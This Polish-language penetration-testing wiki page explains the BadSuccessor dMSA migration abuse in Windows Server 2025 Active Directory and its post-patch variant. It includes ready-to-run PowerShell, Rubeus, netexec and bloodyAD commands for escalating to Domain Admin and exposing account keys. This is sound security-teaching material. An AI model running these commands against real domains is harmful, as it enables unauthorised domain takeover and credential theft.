# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Omówienie

**BadSuccessor** wykorzystuje przepływ migracji **delegated Managed Service Account** (**dMSA**) wprowadzony w **Windows Server 2025**. dMSA można połączyć ze starszym kontem za pomocą **`msDS-ManagedAccountPrecededByLink`** i przeprowadzić przez stany migracji zapisane w **`msDS-DelegatedMSAState`**. Jeśli atakujący może utworzyć dMSA w zapisywalnym OU i kontrolować te atrybuty, KDC może wystawić bilety dla kontrolowanego przez atakującego dMSA z **kontekstem autoryzacji powiązanego konta**.<sup>[[2]](#references)</sup>

W praktyce oznacza to, że użytkownik z niskimi uprawnieniami, który ma jedynie delegowane prawa w OU, może utworzyć nowe dMSA, powiązać je z `Administrator`, zakończyć migrację, a następnie uzyskać TGT, którego PAC zawiera uprzywilejowane grupy, takie jak **Domain Admins**.<sup>[[2]](#references)</sup>

## Istotne szczegóły migracji dMSA

- dMSA to funkcja **Windows Server 2025**.
- `Start-ADServiceAccountMigration` ustawia stan migracji na **rozpoczęty**.
- `Complete-ADServiceAccountMigration` ustawia stan migracji na **zakończony**.
- `msDS-DelegatedMSAState = 1` oznacza, że migracja została rozpoczęta.
- `msDS-DelegatedMSAState = 2` oznacza, że migracja została zakończona.
- Podczas prawidłowej migracji dMSA ma w przejrzysty sposób zastąpić wycofywane konto, dlatego KDC/LSA zachowują dostęp, który miało poprzednie konto.<sup>[[3]](#references)</sup>

Microsoft Learn wskazuje również, że podczas migracji oryginalne konto jest powiązane z dMSA, a dMSA ma mieć dostęp do tych samych zasobów co stare konto.<sup>[[3]](#references)</sup> To właśnie to założenie dotyczące bezpieczeństwa wykorzystuje BadSuccessor.<sup>[[2]](#references)</sup>

## Wymagania

1. Domena, w której **dMSA jest dostępne**, co oznacza, że po stronie AD dostępna jest obsługa **Windows Server 2025**.
2. Atakujący może **tworzyć** obiekty `msDS-DelegatedManagedServiceAccount` w dowolnym OU albo ma tam równoważne, szerokie uprawnienia do tworzenia obiektów podrzędnych.
3. Atakujący może **zapisywać** odpowiednie atrybuty dMSA albo w pełni kontroluje utworzone przez siebie dMSA.
4. Atakujący może zażądać biletów Kerberos z kontekstu przyłączonego do domeny lub przez tunel zapewniający dostęp do LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Praktyczne kontrole

Najprościej potwierdzić gotowość środowiska, sprawdzając poziom domeny/lasu i upewniając się, że środowisko korzysta już z nowego stosu Server 2025:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Jeśli widzisz wartości takie jak `Windows2025Domain` i `Windows2025Forest`, potraktuj **BadSuccessor / dMSA migration abuse** jako priorytetowy element do sprawdzenia.

Możesz też wyliczyć zapisywalne OU z uprawnieniami delegowanymi do tworzenia dMSA za pomocą publicznych narzędzi:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Przebieg nadużycia

1. Utwórz dMSA w OU, w którym masz delegowane uprawnienia do tworzenia obiektów podrzędnych.
2. Ustaw **`msDS-ManagedAccountPrecededByLink`** na DN uprzywilejowanego celu, takiego jak `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Ustaw **`msDS-DelegatedMSAState`** na `2`, aby oznaczyć migrację jako zakończoną.
4. Zażądaj TGT dla nowego dMSA i użyj otrzymanego ticketu, aby uzyskać dostęp do uprzywilejowanych usług.<sup>[[2]](#references)</sup>

Przykład PowerShell:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Przykłady żądania biletu / narzędzi operacyjnych:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Dlaczego to coś więcej niż eskalacja uprawnień

Podczas legalnej migracji Windows musi też umożliwić nowemu dMSA obsługę ticketów wystawionych dla poprzedniego konta przed przełączeniem. Dlatego materiały ticketów związane z dMSA mogą obejmować **bieżące** i **poprzednie** klucze w ramach przepływu **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

W przypadku fałszywej migracji kontrolowanej przez atakującego takie działanie może zmienić BadSuccessor w:<sup>[[2]](#references)</sup>

- **Eskalację uprawnień** przez dziedziczenie uprzywilejowanych SID grup w PAC.
- **Ujawnienie materiałów uwierzytelniających**, ponieważ obsługa poprzedniego klucza może ujawnić materiał równoważny hash’owi RC4/NT poprzednika w podatnych przepływach pracy.

Dzięki temu technika przydaje się zarówno do bezpośredniego przejęcia domeny, jak i do dalszych działań, takich jak pass-the-hash lub szersze przejęcie poświadczeń.

## BetterSuccessor po poprawce KDC

Poprawiony KDC weryfikuje obie strony migracji dMSA. Oprócz `msDS-ManagedAccountPrecededByLink` i stanu migracji dMSA, poprzednik musi wskazywać z powrotem na dMSA za pomocą `msDS-SupersededManagedAccountLink` oraz mieć zgodny `msDS-SupersededServiceAccountState`. Jednokierunkowe łącze już nie działa; konto, które może jedynie utworzyć dMSA, nie może wskazać dowolnego poprzednika. Mając `CreateChild` dla dMSA w OU **oraz** efektywne uprawnienia zapisu do atrybutów migracji wybranego konta docelowego, atakujący może utworzyć wzajemne łącze. Powstały ticket dMSA może zawierać kontekst autoryzacji poprzednika i ujawnić jego klucze w pakiecie kluczy dMSA. To ukierunkowana ścieżka dostępu do poświadczeń i zwiększania uprawnień, a nie dowód na to, że pierwotny BadSuccessor z dowolnym celem nadal jest możliwy na załatanych DC.<sup>[[5]](#references)[[6]](#references)</sup>

W środowisku testowym, w którym potwierdzono możliwość zapisu do konta docelowego, `bloodyAD` może utworzyć dMSA i wykonać sparowane zapisy migracyjne. Zażądaj ticketu dMSA przy użyciu zwróconych danych Kerberos i sprawdź rzeczywiste uprawnienia konta docelowego, zanim założysz, że odzyskano jego uprawnienia lub hash. Nazwa podkomendy `badSuccessor` nie oznacza, że działa ona jak niezałatane zachowanie jednokierunkowe.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Uwagi dotyczące statusu poprawek

Pierwotne działanie BadSuccessor **nie jest tylko teoretycznym problemem z wersji preview z 2025 roku**. Microsoft przypisał mu identyfikator **CVE-2025-53779** i opublikował aktualizację zabezpieczeń w **sierpniu 2025 roku**.<sup>[[4]](#references)</sup> Zachowaj opis tego ataku na potrzeby:

- **laboratoriów / CTF-ów / ćwiczeń assume-breach**
- **niezałatanych środowisk Windows Server 2025**
- **weryfikacji delegacji OU i narażenia dMSA podczas testów**

Nie zakładaj, że domena Windows Server 2025 jest podatna tylko dlatego, że istnieje w niej dMSA; sprawdź poziom poprawek i przeprowadź ostrożne testy.

## Narzędzia

- [Narzędzie Akamai BadSuccessor](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Moduł `badsuccessor` NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen — nadużycie dMSA w BadSuccessor w celu uzyskania uprawnień Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai — BadSuccessor: nadużywanie dMSA w celu eskalacji uprawnień w Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn — Omówienie delegowanych zarządzanych kont usług](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center — CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai — BadSuccessor nie żyje, niech żyje BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security — BetterSuccessor: dalsze nadużywanie dMSA po poprawce](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf — HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
